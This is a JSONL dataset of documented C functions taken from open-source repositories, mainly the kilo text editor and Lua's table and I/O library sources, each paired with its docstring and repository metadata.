{"docstring": "/* Set every byte of row->hl (that corresponds to every character in the line)\n * to the right syntax highlight type (HL_* defines). */\n", "func_signal": "void editorUpdateSyntax(erow *row)", "code": "{\n    row->hl = realloc(row->hl,row->rsize);\n    memset(row->hl,HL_NORMAL,row->rsize);\n\n    if (E.syntax == NULL) return; /* No syntax, everything is HL_NORMAL. */\n\n    int i, prev_sep, in_string, in_comment;\n    char *p;\n    char **keywords = E.syntax->keywords;\n    char *scs = E.syntax->singleline_comment_start;\n    char *mcs = E.syntax->multiline_comment_start;\n    char *mce = E.syntax->multiline_comment_end;\n\n    /* Point to the first non-space char. */\n    p = row->render;\n    i = 0; /* Current char offset */\n    while(*p && isspace(*p)) {\n        p++;\n        i++;\n    }\n    prev_sep = 1; /* Tell the parser if 'i' points to start of word. */\n    in_string = 0; /* Are we inside \"\" or '' ? */\n    in_comment = 0; /* Are we inside multi-line comment? */\n\n    /* If the previous line has an open comment, this line starts\n     * with an open comment state. */\n    if (row->idx > 0 && editorRowHasOpenComment(&E.row[row->idx-1]))\n        in_comment = 1;\n\n    while(*p) {\n        /* Handle // comments. */\n        if (prev_sep && *p == scs[0] && *(p+1) == scs[1]) {\n            /* From here to end is a comment */\n            memset(row->hl+i,HL_COMMENT,row->size-i);\n            return;\n        }\n\n        /* Handle multi line comments. */\n        if (in_comment) {\n            row->hl[i] = HL_MLCOMMENT;\n            if (*p == mce[0] && *(p+1) == mce[1]) {\n                row->hl[i+1] = HL_MLCOMMENT;\n                p += 2; i += 2;\n                in_comment = 0;\n                prev_sep = 1;\n                continue;\n            } else {\n                prev_sep = 0;\n                p++; i++;\n                continue;\n            }\n        } else if (*p == mcs[0] && *(p+1) == mcs[1]) {\n            row->hl[i] = HL_MLCOMMENT;\n            row->hl[i+1] = HL_MLCOMMENT;\n            p += 2; i += 2;\n            in_comment = 1;\n            prev_sep = 0;\n            continue;\n        }\n\n        /* Handle \"\" and '' */\n        if (in_string) {\n            row->hl[i] = HL_STRING;\n            if (*p == '\\\\') {\n                row->hl[i+1] = HL_STRING;\n                p += 2; i += 2;\n                prev_sep = 0;\n                continue;\n            }\n            if (*p == in_string) in_string = 0;\n            p++; i++;\n            continue;\n        } else {\n            if (*p == '\"' || *p == '\\'') {\n                in_string = *p;\n                row->hl[i] = HL_STRING;\n                p++; i++;\n                prev_sep = 0;\n                continue;\n            }\n        }\n\n        /* Handle non printable chars. */\n        if (!isprint(*p)) {\n            row->hl[i] = HL_NONPRINT;\n            p++; i++;\n            prev_sep = 0;\n            continue;\n        }\n\n        /* Handle numbers */\n        if ((isdigit(*p) && (prev_sep || row->hl[i-1] == HL_NUMBER)) ||\n            (*p == '.' && i >0 && row->hl[i-1] == HL_NUMBER)) {\n            row->hl[i] = HL_NUMBER;\n            p++; i++;\n            prev_sep = 0;\n            continue;\n        }\n\n        /* Handle keywords and lib calls */\n        if (prev_sep) {\n            int j;\n            for (j = 0; keywords[j]; j++) {\n                int klen = strlen(keywords[j]);\n                int kw2 = keywords[j][klen-1] == '|';\n                if (kw2) klen--;\n\n                if (!memcmp(p,keywords[j],klen) &&\n                    is_separator(*(p+klen)))\n                {\n                    /* Keyword */\n                    memset(row->hl+i,kw2 ? HL_KEYWORD2 : HL_KEYWORD1,klen);\n                    p += klen;\n                    i += klen;\n                    break;\n                }\n            }\n            if (keywords[j] != NULL) {\n                prev_sep = 0;\n                continue; /* We had a keyword match */\n            }\n        }\n\n        /* Not special chars */\n        prev_sep = is_separator(*p);\n        p++; i++;\n    }\n\n    /* Propagate syntax change to the next row if the open commen\n     * state changed. This may recursively affect all the following rows\n     * in the file. */\n    int oc = editorRowHasOpenComment(row);\n    if (row->hl_oc != oc && row->idx+1 < E.numrows)\n        editorUpdateSyntax(&E.row[row->idx+1]);\n    row->hl_oc = oc;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Delete the char at the current prompt position. */\n", "func_signal": "void editorDelChar()", "code": "{\n    int filerow = E.rowoff+E.cy;\n    int filecol = E.coloff+E.cx;\n    erow *row = (filerow >= E.numrows) ? NULL : &E.row[filerow];\n\n    if (!row || (filecol == 0 && filerow == 0)) return;\n    if (filecol == 0) {\n        /* Handle the case of column 0, we need to move the current line\n         * on the right of the previous one. */\n        filecol = E.row[filerow-1].size;\n        editorRowAppendString(&E.row[filerow-1],row->chars,row->size);\n        editorDelRow(filerow);\n        row = NULL;\n        if (E.cy == 0)\n            E.rowoff--;\n        else\n            E.cy--;\n        E.cx = filecol;\n        if (E.cx >= E.screencols) {\n            int shift = (E.screencols-E.cx)+1;\n            E.cx -= shift;\n            E.coloff += shift;\n        }\n    } else {\n        editorRowDelChar(row,filecol-1);\n        if (E.cx == 0 && E.coloff)\n            E.coloff--;\n        else\n            E.cx--;\n    }\n    if (row) editorUpdateRow(row);\n    E.dirty++;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Set an editor status message for the second line of the status, at the\n * end of the screen. */\n", "func_signal": "void editorSetStatusMessage(const char *fmt, ...)", "code": "{\n    va_list ap;\n    va_start(ap,fmt);\n    vsnprintf(E.statusmsg,sizeof(E.statusmsg),fmt,ap);\n    va_end(ap);\n    E.statusmsg_time = time(NULL);\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Raw mode: 1960 magic shit. */\n", "func_signal": "int enableRawMode(int fd)", "code": "{\n    struct termios raw;\n\n    if (E.rawmode) return 0; /* Already enabled. */\n    if (!isatty(STDIN_FILENO)) goto fatal;\n    atexit(editorAtExit);\n    if (tcgetattr(fd,&orig_termios) == -1) goto fatal;\n\n    raw = orig_termios;  /* modify the original mode */\n    /* input modes: no break, no CR to NL, no parity check, no strip char,\n     * no start/stop output control. */\n    raw.c_iflag &= ~(BRKINT | ICRNL | INPCK | ISTRIP | IXON);\n    /* output modes - disable post processing */\n    raw.c_oflag &= ~(OPOST);\n    /* control modes - set 8 bit chars */\n    raw.c_cflag |= (CS8);\n    /* local modes - choing off, canonical off, no extended functions,\n     * no signal chars (^Z,^C) */\n    raw.c_lflag &= ~(ECHO | ICANON | IEXTEN | ISIG);\n    /* control chars - set return condition: min number of bytes and timer. */\n    raw.c_cc[VMIN] = 0; /* Return each byte, or zero for timeout. */\n    raw.c_cc[VTIME] = 1; /* 100 ms timeout (unit is tens of second). */\n\n    /* put terminal in raw mode after flushing */\n    if (tcsetattr(fd,TCSAFLUSH,&raw) < 0) goto fatal;\n    E.rawmode = 1;\n    return 0;\n\nfatal:\n    errno = ENOTTY;\n    return -1;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Use the ESC [6n escape sequence to query the horizontal cursor position\n * and return it. On error -1 is returned, on success the position of the\n * cursor is stored at *rows and *cols and 0 is returned. */\n", "func_signal": "int getCursorPosition(int ifd, int ofd, int *rows, int *cols)", "code": "{\n    char buf[32];\n    unsigned int i = 0;\n\n    /* Report cursor location */\n    if (write(ofd, \"\\x1b[6n\", 4) != 4) return -1;\n\n    /* Read the response: ESC [ rows ; cols R */\n    while (i < sizeof(buf)-1) {\n        if (read(ifd,buf+i,1) != 1) break;\n        if (buf[i] == 'R') break;\n        i++;\n    }\n    buf[i] = '\\0';\n\n    /* Parse it. */\n    if (buf[0] != ESC || buf[1] != '[') return -1;\n    if (sscanf(buf+2,\"%d;%d\",rows,cols) != 2) return -1;\n    return 0;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Read a key from the terminal put in raw mode, trying to handle\n * escape sequences. */\n", "func_signal": "int editorReadKey(int fd)", "code": "{\n    int nread;\n    char c, seq[3];\n    while ((nread = read(fd,&c,1)) == 0);\n    if (nread == -1) exit(1);\n\n    while(1) {\n        switch(c) {\n        case ESC:    /* escape sequence */\n            /* If this is just an ESC, we'll timeout here. */\n            if (read(fd,seq,1) == 0) return ESC;\n            if (read(fd,seq+1,1) == 0) return ESC;\n\n            /* ESC [ sequences. */\n            if (seq[0] == '[') {\n                if (seq[1] >= '0' && seq[1] <= '9') {\n                    /* Extended escape, read additional byte. */\n                    if (read(fd,seq+2,1) == 0) return ESC;\n                    if (seq[2] == '~') {\n                        switch(seq[1]) {\n                        case '3': return DEL_KEY;\n                        case '5': return PAGE_UP;\n                        case '6': return PAGE_DOWN;\n                        }\n                    }\n                } else {\n                    switch(seq[1]) {\n                    case 'A': return ARROW_UP;\n                    case 'B': return ARROW_DOWN;\n                    case 'C': return ARROW_RIGHT;\n                    case 'D': return ARROW_LEFT;\n                    case 'H': return HOME_KEY;\n                    case 'F': return END_KEY;\n                    }\n                }\n            }\n\n            /* ESC O sequences. */\n            else if (seq[0] == 'O') {\n                switch(seq[1]) {\n                case 'H': return HOME_KEY;\n                case 'F': return END_KEY;\n                }\n            }\n            break;\n        default:\n            return c;\n        }\n    }\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Inserting a newline is slightly complex as we have to handle inserting a\n * newline in the middle of a line, splitting the line as needed. */\n", "func_signal": "void editorInsertNewline(void)", "code": "{\n    int filerow = E.rowoff+E.cy;\n    int filecol = E.coloff+E.cx;\n    erow *row = (filerow >= E.numrows) ? NULL : &E.row[filerow];\n\n    if (!row) {\n        if (filerow == E.numrows) {\n            editorInsertRow(filerow,\"\",0);\n            goto fixcursor;\n        }\n        return;\n    }\n    /* If the cursor is over the current line size, we want to conceptually\n     * think it's just over the last character. */\n    if (filecol >= row->size) filecol = row->size;\n    if (filecol == 0) {\n        editorInsertRow(filerow,\"\",0);\n    } else {\n        /* We are in the middle of a line. Split it between two rows. */\n        editorInsertRow(filerow+1,row->chars+filecol,row->size-filecol);\n        row = &E.row[filerow];\n        row->chars[filecol] = '\\0';\n        row->size = filecol;\n        editorUpdateRow(row);\n    }\nfixcursor:\n    if (E.cy == E.screenrows-1) {\n        E.rowoff++;\n    } else {\n        E.cy++;\n    }\n    E.cx = 0;\n    E.coloff = 0;\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Select the syntax highlight scheme depending on the filename,\n * setting it in the global state E.syntax. */\n", "func_signal": "void editorSelectSyntaxHighlight(char *filename)", "code": "{\n    for (unsigned int j = 0; j < HLDB_ENTRIES; j++) {\n        struct editorSyntax *s = HLDB+j;\n        unsigned int i = 0;\n        while(s->filematch[i]) {\n            char *p;\n            int patlen = strlen(s->filematch[i]);\n            if ((p = strstr(filename,s->filematch[i])) != NULL) {\n                if (s->filematch[i][0] != '.' || p[patlen] == '\\0') {\n                    E.syntax = s;\n                    return;\n                }\n            }\n            i++;\n        }\n    }\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/* Handle cursor position change because arrow keys were pressed. */\n", "func_signal": "void editorMoveCursor(int key)", "code": "{\n    int filerow = E.rowoff+E.cy;\n    int filecol = E.coloff+E.cx;\n    int rowlen;\n    erow *row = (filerow >= E.numrows) ? NULL : &E.row[filerow];\n\n    switch(key) {\n    case ARROW_LEFT:\n        if (E.cx == 0) {\n            if (E.coloff) {\n                E.coloff--;\n            } else {\n                if (filerow > 0) {\n                    E.cy--;\n                    E.cx = E.row[filerow-1].size;\n                    if (E.cx > E.screencols-1) {\n                        E.coloff = E.cx-E.screencols+1;\n                        E.cx = E.screencols-1;\n                    }\n                }\n            }\n        } else {\n            E.cx -= 1;\n        }\n        break;\n    case ARROW_RIGHT:\n        if (row && filecol < row->size) {\n            if (E.cx == E.screencols-1) {\n                E.coloff++;\n            } else {\n                E.cx += 1;\n            }\n        } else if (row && filecol == row->size) {\n            E.cx = 0;\n            E.coloff = 0;\n            if (E.cy == E.screenrows-1) {\n                E.rowoff++;\n            } else {\n                E.cy += 1;\n            }\n        }\n        break;\n    case ARROW_UP:\n        if (E.cy == 0) {\n            if (E.rowoff) E.rowoff--;\n        } else {\n            E.cy -= 1;\n        }\n        break;\n    case ARROW_DOWN:\n        if (filerow < E.numrows) {\n            if (E.cy == E.screenrows-1) {\n                E.rowoff++;\n            } else {\n                E.cy += 1;\n            }\n        }\n        break;\n    }\n    /* Fix cx if the current line has not enough chars. */\n    filerow = E.rowoff+E.cy;\n    filecol = E.coloff+E.cx;\n    row = (filerow >= E.numrows) ? NULL : &E.row[filerow];\n    rowlen = row ? row->size : 0;\n    if (filecol > rowlen) {\n        E.cx -= filecol-rowlen;\n        if (E.cx < 0) {\n            E.coloff += E.cx;\n            E.cx = 0;\n        }\n    }\n}", "path": "kilo/kilo.c", "commit_date": "2020-07-05 00:00:00", "repo_name": "antirez/kilo", "stars": 7046, "license": "bsd-2-clause", "language": "c", "size": 37}
{"docstring": "/*\n** Accept current char if it is in 'set' (of size 2)\n*/\n", "func_signal": "static int test2 (RN *rn, const char *set)", "code": "{\n  if (rn->c == set[0] || rn->c == set[1])\n    return nextc(rn);\n  else return 0;\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** Count keys in array part of table 't': Fill 'nums[i]' with\n** number of keys that will go into corresponding slice and return\n** total number of non-nil keys.\n*/\n", "func_signal": "static unsigned int numusearray (const Table *t, unsigned int *nums)", "code": "{\n  int lg;\n  unsigned int ttlg;  /* 2^lg */\n  unsigned int ause = 0;  /* summation of 'nums' */\n  unsigned int i = 1;  /* count to traverse all array keys */\n  /* traverse each slice */\n  for (lg = 0, ttlg = 1; lg <= MAXABITS; lg++, ttlg *= 2) {\n    unsigned int lc = 0;  /* counter */\n    unsigned int lim = ttlg;\n    if (lim > t->sizearray) {\n      lim = t->sizearray;  /* adjust upper limit */\n      if (i > lim)\n        break;  /* no more elements to count */\n    }\n    /* count elements in range (2^(lg - 1), 2^lg] */\n    for (; i <= lim; i++) {\n      if (!ttisnil(&t->array[i-1]))\n        lc++;\n    }\n    nums[lg] += lc;\n    ause += lc;\n  }\n  return ause;\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/* Check whether 'mode' matches '[rwa]%+?[L_MODEEXT]*' */\n", "func_signal": "static int l_checkmode (const char *mode)", "code": "{\n  return (*mode != '\\0' && strchr(\"rwa\", *(mode++)) != NULL &&\n         (*mode != '+' || (++mode, 1)) &&  /* skip if char is '+' */\n         (strspn(mode, L_MODEEXT) == strlen(mode)));  /* check extensions */\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** Read a sequence of (hex)digits\n*/\n", "func_signal": "static int readdigits (RN *rn, int hex)", "code": "{\n  int count = 0;\n  while ((hex ? isxdigit(rn->c) : isdigit(rn->c)) && nextc(rn))\n    count++;\n  return count;\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** beware: when using this function you probably need to check a GC\n** barrier and invalidate the TM cache.\n*/\n", "func_signal": "TValue *luaH_set (lua_State *L, Table *t, const TValue *key)", "code": "{\n  const TValue *p = luaH_get(t, key);\n  if (p != luaO_nilobject)\n    return cast(TValue *, p);\n  else return luaH_newkey(L, t, key);\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** returns the 'main' position of an element in a table (that is, the index\n** of its hash value)\n*/\n", "func_signal": "static Node *mainposition (const Table *t, const TValue *key)", "code": "{\n  switch (ttype(key)) {\n    case LUA_TNUMINT:\n      return hashint(t, ivalue(key));\n    case LUA_TNUMFLT:\n      return hashmod(t, l_hashfloat(fltvalue(key)));\n    case LUA_TSHRSTR:\n      return hashstr(t, tsvalue(key));\n    case LUA_TLNGSTR:\n      return hashpow2(t, luaS_hashlongstr(tsvalue(key)));\n    case LUA_TBOOLEAN:\n      return hashboolean(t, bvalue(key));\n    case LUA_TLIGHTUSERDATA:\n      return hashpointer(t, pvalue(key));\n    case LUA_TLCF:\n      return hashpointer(t, fvalue(key));\n    default:\n      lua_assert(!ttisdeadkey(key));\n      return hashpointer(t, gcvalue(key));\n  }\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** function to close regular files\n*/\n", "func_signal": "static int io_fclose (lua_State *L)", "code": "{\n  LStream *p = tolstream(L);\n  int res = fclose(p->f);\n  return luaL_fileresult(L, (res == 0), NULL);\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** nums[i] = number of keys 'k' where 2^(i - 1) < k <= 2^i\n*/\n", "func_signal": "static void rehash (lua_State *L, Table *t, const TValue *ek)", "code": "{\n  unsigned int asize;  /* optimal size for array part */\n  unsigned int na;  /* number of keys in the array part */\n  unsigned int nums[MAXABITS + 1];\n  int i;\n  int totaluse;\n  for (i = 0; i <= MAXABITS; i++) nums[i] = 0;  /* reset counts */\n  na = numusearray(t, nums);  /* count keys in array part */\n  totaluse = na;  /* all those keys are integer keys */\n  totaluse += numusehash(t, nums, &na);  /* count keys in hash part */\n  /* count extra key */\n  na += countint(ek, nums);\n  totaluse++;\n  /* compute new size for array part */\n  asize = computesizes(nums, &na);\n  /* resize the table to new computed sizes */\n  luaH_resize(L, t, asize, totaluse - na);\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** When creating file handles, always creates a 'closed' file handle\n** before opening the actual file; so, if there is a memory error, the\n** handle is in a consistent state.\n*/\n", "func_signal": "static LStream *newprefile (lua_State *L)", "code": "{\n  LStream *p = (LStream *)lua_newuserdata(L, sizeof(LStream));\n  p->closef = NULL;  /* mark file handle as 'closed' */\n  luaL_setmetatable(L, LUA_FILEHANDLE);\n  return p;\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** returns the index of a 'key' for table traversals. First goes all\n** elements in the array part, then elements in the hash part. The\n** beginning of a traversal is signaled by 0.\n*/\n", "func_signal": "static unsigned int findindex (lua_State *L, Table *t, StkId key)", "code": "{\n  unsigned int i;\n  if (ttisnil(key)) return 0;  /* first iteration */\n  i = arrayindex(key);\n  if (i != 0 && i <= t->sizearray)  /* is 'key' inside array part? */\n    return i;  /* yes; that's the index */\n  else {\n    int nx;\n    Node *n = mainposition(t, key);\n    for (;;) {  /* check whether 'key' is somewhere in the chain */\n      /* key may be dead already, but it is ok to use it in 'next' */\n      if (luaV_rawequalobj(gkey(n), key) ||\n            (ttisdeadkey(gkey(n)) && iscollectable(key) &&\n             deadvalue(gkey(n)) == gcvalue(key))) {\n        i = cast_int(n - gnode(t, 0));  /* key index in hash table */\n        /* hash elements are numbered after array ones */\n        return (i + 1) + t->sizearray;\n      }\n      nx = gnext(n);\n      if (nx == 0)\n        luaG_runerror(L, \"invalid key to 'next'\");  /* key not found */\n      else n += nx;\n    }\n  }\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** Try to find a boundary in table 't'. A 'boundary' is an integer index\n** such that t[i] is non-nil and t[i+1] is nil (and 0 if t[1] is nil).\n*/\n", "func_signal": "lua_Unsigned luaH_getn (Table *t)", "code": "{\n  unsigned int j = t->sizearray;\n  if (j > 0 && ttisnil(&t->array[j - 1])) {\n    /* there is a boundary in the array part: (binary) search for it */\n    unsigned int i = 0;\n    while (j - i > 1) {\n      unsigned int m = (i+j)/2;\n      if (ttisnil(&t->array[m - 1])) j = m;\n      else i = m;\n    }\n    return i;\n  }\n  /* else must find a boundary in hash part */\n  else if (isdummy(t))  /* hash part is empty? */\n    return j;  /* that is easy... */\n  else return unbound_search(t, j);\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** \"Generic\" get version. (Not that generic: not valid for integers,\n** which may be in array part, nor for floats with integral values.)\n*/\n", "func_signal": "static const TValue *getgeneric (Table *t, const TValue *key)", "code": "{\n  Node *n = mainposition(t, key);\n  for (;;) {  /* check whether 'key' is somewhere in the chain */\n    if (luaV_rawequalobj(gkey(n), key))\n      return gval(n);  /* that's it */\n    else {\n      int nx = gnext(n);\n      if (nx == 0)\n        return luaO_nilobject;  /* not found */\n      n += nx;\n    }\n  }\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** Add current char to buffer (if not out of space) and read next one\n*/\n", "func_signal": "static int nextc (RN *rn)", "code": "{\n  if (rn->n >= L_MAXLENNUM) {  /* buffer overflow? */\n    rn->buff[0] = '\\0';  /* invalidate result */\n    return 0;  /* fail */\n  }\n  else {\n    rn->buff[rn->n++] = rn->c;  /* save current char */\n    rn->c = l_getc(rn->f);  /* read next one */\n    return 1;\n  }\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** search function for short strings\n*/\n", "func_signal": "const TValue *luaH_getshortstr (Table *t, TString *key)", "code": "{\n  Node *n = hashstr(t, key);\n  lua_assert(key->tt == LUA_TSHRSTR);\n  for (;;) {  /* check whether 'key' is somewhere in the chain */\n    const TValue *k = gkey(n);\n    if (ttisshrstring(k) && eqshrstr(tsvalue(k), key))\n      return gval(n);  /* that's it */\n    else {\n      int nx = gnext(n);\n      if (nx == 0)\n        return luaO_nilobject;  /* not found */\n      n += nx;\n    }\n  }\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** inserts a new key into a hash table; first, check whether key's main\n** position is free. If not, check whether colliding node is in its main\n** position or not: if it is not, move colliding node to an empty place and\n** put new key in its main position; otherwise (colliding node is in its main\n** position), new key goes to an empty position.\n*/\n", "func_signal": "TValue *luaH_newkey (lua_State *L, Table *t, const TValue *key)", "code": "{\n  Node *mp;\n  TValue aux;\n  if (ttisnil(key)) luaG_runerror(L, \"table index is nil\");\n  else if (ttisfloat(key)) {\n    lua_Integer k;\n    if (luaV_tointeger(key, &k, 0)) {  /* does index fit in an integer? */\n      setivalue(&aux, k);\n      key = &aux;  /* insert it as an integer */\n    }\n    else if (luai_numisnan(fltvalue(key)))\n      luaG_runerror(L, \"table index is NaN\");\n  }\n  mp = mainposition(t, key);\n  if (!ttisnil(gval(mp)) || isdummy(t)) {  /* main position is taken? */\n    Node *othern;\n    Node *f = getfreepos(t);  /* get a free place */\n    if (f == NULL) {  /* cannot find a free place? */\n      rehash(L, t, key);  /* grow table */\n      /* whatever called 'newkey' takes care of TM cache */\n      return luaH_set(L, t, key);  /* insert key into grown table */\n    }\n    lua_assert(!isdummy(t));\n    othern = mainposition(t, gkey(mp));\n    if (othern != mp) {  /* is colliding node out of its main position? */\n      /* yes; move colliding node into free position */\n      while (othern + gnext(othern) != mp)  /* find previous */\n        othern += gnext(othern);\n      gnext(othern) = cast_int(f - othern);  /* rechain to point to 'f' */\n      *f = *mp;  /* copy colliding node into free pos. (mp->next also goes) */\n      if (gnext(mp) != 0) {\n        gnext(f) += cast_int(mp - f);  /* correct 'next' */\n        gnext(mp) = 0;  /* now 'mp' is free */\n      }\n      setnilvalue(gval(mp));\n    }\n    else {  /* colliding node is in its own main position */\n      /* new node will go into free position */\n      if (gnext(mp) != 0)\n        gnext(f) = cast_int((mp + gnext(mp)) - f);  /* chain new position */\n      else lua_assert(gnext(f) == 0);\n      gnext(mp) = cast_int(f - mp);\n      mp = f;\n    }\n  }\n  setnodekey(L, &mp->i_key, key);\n  luaC_barrierback(L, t, key);\n  lua_assert(ttisnil(gval(mp)));\n  return gval(mp);\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** function to close 'popen' files\n*/\n", "func_signal": "static int io_pclose (lua_State *L)", "code": "{\n  LStream *p = tolstream(L);\n  return luaL_execresult(L, l_pclose(L, p->f));\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** returns the index for 'key' if 'key' is an appropriate key to live in\n** the array part of the table, 0 otherwise.\n*/\n", "func_signal": "static unsigned int arrayindex (const TValue *key)", "code": "{\n  if (ttisinteger(key)) {\n    lua_Integer k = ivalue(key);\n    if (0 < k && (lua_Unsigned)k <= MAXASIZE)\n      return cast(unsigned int, k);  /* 'key' is an appropriate array index */\n  }\n  return 0;  /* 'key' did not match some condition */\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** Calls the 'close' function from a file handle. The 'volatile' avoids\n** a bug in some versions of the Clang compiler (e.g., clang 3.0 for\n** 32 bits).\n*/\n", "func_signal": "static int aux_close (lua_State *L)", "code": "{\n  LStream *p = tolstream(L);\n  volatile lua_CFunction cf = p->closef;\n  p->closef = NULL;  /* mark stream as closed */\n  return (*cf)(L);  /* close it */\n}", "path": "mjolnir/Mjolnir/lua/liolib.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** main search function\n*/\n", "func_signal": "const TValue *luaH_get (Table *t, const TValue *key)", "code": "{\n  switch (ttype(key)) {\n    case LUA_TSHRSTR: return luaH_getshortstr(t, tsvalue(key));\n    case LUA_TNUMINT: return luaH_getint(t, ivalue(key));\n    case LUA_TNIL: return luaO_nilobject;\n    case LUA_TNUMFLT: {\n      lua_Integer k;\n      if (luaV_tointeger(key, &k, 0)) /* index is int? */\n        return luaH_getint(t, k);  /* use specialized version */\n      /* else... */\n    }  /* FALLTHROUGH */\n    default:\n      return getgeneric(t, key);\n  }\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "/*\n** search function for integers\n*/\n", "func_signal": "const TValue *luaH_getint (Table *t, lua_Integer key)", "code": "{\n  /* (1 <= key && key <= t->sizearray) */\n  if (l_castS2U(key) - 1 < t->sizearray)\n    return &t->array[key - 1];\n  else {\n    Node *n = hashint(t, key);\n    for (;;) {  /* check whether 'key' is somewhere in the chain */\n      if (ttisinteger(gkey(n)) && ivalue(gkey(n)) == key)\n        return gval(n);  /* that's it */\n      else {\n        int nx = gnext(n);\n        if (nx == 0) break;\n        n += nx;\n      }\n    }\n    return luaO_nilobject;\n  }\n}", "path": "mjolnir/Mjolnir/lua/ltable.c", "commit_date": "2019-05-07 00:00:00", "repo_name": "mjolnirapp/mjolnir", "stars": 5204, "license": "None", "language": "c", "size": 11475}
{"docstring": "// internal malloc\n", "func_signal": "static void* ikcp_malloc(size_t size)", "code": "{\n\tif (ikcp_malloc_hook) \n\t\treturn ikcp_malloc_hook(size);\n\treturn malloc(size);\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
